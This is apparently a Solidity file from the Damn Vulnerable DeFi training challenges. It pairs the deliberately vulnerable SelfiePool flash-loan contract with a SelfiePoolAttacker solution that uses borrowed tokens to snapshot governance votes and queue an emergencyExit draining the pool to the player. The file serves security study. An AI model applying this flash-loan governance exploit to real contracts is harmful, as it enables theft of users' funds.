// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token)
            return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token)
            revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token))
            revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
            revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();
        
        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    SelfiePool pool;
    DamnValuableTokenSnapshot snapshotToken;
    SimpleGovernance governance;
    address player;

    constructor(SelfiePool _pool) {
        pool = _pool;
        snapshotToken = DamnValuableTokenSnapshot(address(pool.token()));
        governance = pool.governance();
        player = msg.sender;
    }

    /// @dev get a flash loan and take a snapshot, then queue the action to drain the pool (emergencyExit)
    function attack() public {
        pool.flashLoan(this, address(snapshotToken), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        snapshotToken.snapshot();
        governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );
        snapshotToken.approve(address(pool), 1_500_000 ether);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
